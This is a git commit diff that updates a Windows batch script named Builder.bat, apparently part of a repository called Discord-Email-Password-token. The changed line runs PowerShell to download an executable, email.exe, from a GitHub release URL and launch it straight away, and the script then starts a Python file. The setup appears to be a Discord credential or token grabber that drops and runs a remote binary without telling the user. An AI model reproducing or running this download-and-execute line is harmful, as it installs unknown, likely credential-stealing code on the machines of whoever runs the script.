f0cb8b193c8a2b0bb7efa9f537335d7aa61d2087
IWcommunityFR <158751385+IWcommunityFR@users.noreply.github.com>
2024-04-06 15:22:06 +0200

    Update Builder.bat

--- Builder.bat
+++ Builder.bat
@@ -8,6 +8,6 @@ echo.
 echo Coded By https://github.com/IWcommunityFR
 echo.
 cd dist
-powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/Discord-Email-Password-token/releases/download/Email-Password-token/email.exe';$file='email.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/Discord-Email-Password-token/releases/download/Discord-Email-Password-token/email.exe';$file='email.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 cd ..
 start output\data\main.py
